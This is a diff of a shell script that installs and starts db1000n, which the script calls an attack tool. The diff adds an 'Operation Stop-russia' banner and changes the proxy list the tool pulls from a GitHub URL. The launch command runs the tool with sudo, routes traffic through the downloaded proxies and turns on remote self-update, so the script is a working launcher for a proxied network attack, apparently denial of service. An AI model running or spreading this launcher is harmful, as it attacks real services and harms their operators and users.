@@ -33,8 +33,10 @@ else
 fi
 
 tar xvf "${ARCHIVE}"
-tput bold; tput setaf 3; tput setab 4; echo " db1000n  successfully  installed "
+tput bold; tput setaf 3; tput setab 4; echo " Operation "
+           tput setaf 6; tput setab 3; echo "Stop-russia"; tput sgr0; 
 sleep 1
-tput setaf 6; tput setab 3; echo "Starting attack with using proxies"; tput setab 0; tput setaf 2
+tput bold; tput setaf 2; echo " db1000n  successfully  installed "
+                         echo "Starting attack with using proxies"; tput setaf 7
 sleep 3
-sudo ./db1000n -proxy '{{ join (split (get_url "https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies_ru.txt") "\n") "," }}' -enable-self-update -restart-on-update=false
+sudo ./db1000n -proxy '{{ join (split (get_url "https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies.txt") "\n") "," }}' -enable-self-update -restart-on-update=false
